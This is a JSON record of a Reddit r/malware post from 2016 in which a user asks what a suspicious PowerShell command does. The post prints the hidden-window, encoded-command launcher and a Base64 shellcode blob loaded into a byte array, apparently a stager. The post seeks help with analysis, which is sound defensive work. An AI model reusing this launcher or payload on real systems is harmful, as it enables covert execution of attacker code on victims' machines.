@@ -1,0 +1,21 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "powershell.exe -nop -w hidden -encodedcommand \"Some Base 64\"\n\nWhen we try to decode it. another encoded part reappears\n\n[Byte[]]$var_code = [System.Convert]::FromBase64String(\"/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdMcBqQGgAEAAAaP//BwBqAGhYpFPl/9VQ6agAAABaMclRUWgAsAQAaACwBABqAWoGagNSaEVw39T/1VCLFCRqAFJoKG994v/VhcB0bmoAagBqAInmg8YEieKDwgiLfCQMagBWagRSV2itnl+7/9WLVCQQagBWaAAgAABSV2itnl+7/9WFwHQUi0wkBIsEJAHIiQQki1QkEAHC69eLfCQMV2jA+t38/9VXaMaWh1L/1YsEJItMJAg5wXQHaPC1olb/1f9kJBDoU////1xcLlxwaXBlXHN0YXR1c184MDgwAA==\")\n\nWhich we have a hard time determining what that piece of code will do :)",
+        "title": "Possible Powershell malware",
+        "score": 11,
+        "id": "5hasss",
+        "commsNum": 14,
+        "timeStamp": "2016/12/08-16:53:28",
+        "author_name": "kirloxchamploo",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 14,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/5hasss/possible_powershell_malware/"
+    },
+    "posts": {}
+}
